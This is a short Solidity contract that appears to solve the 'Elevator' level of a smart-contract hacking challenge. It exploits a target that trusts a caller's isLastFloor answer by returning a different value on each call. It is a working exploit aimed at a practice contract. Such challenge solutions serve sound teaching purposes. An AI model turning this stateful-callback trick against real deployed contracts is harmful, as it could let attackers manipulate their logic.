// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorHack {
    IElevator public challenge;
    uint256 timesCalled;

    constructor(address challengeAddress) {
        challenge = IElevator(challengeAddress);
    }

    function attack() external payable {
        challenge.goTo(0);
    }

    function isLastFloor(uint256 /* floor */) external returns (bool) {
        timesCalled++;
        if (timesCalled > 1) return true;
        else return false;
    }
}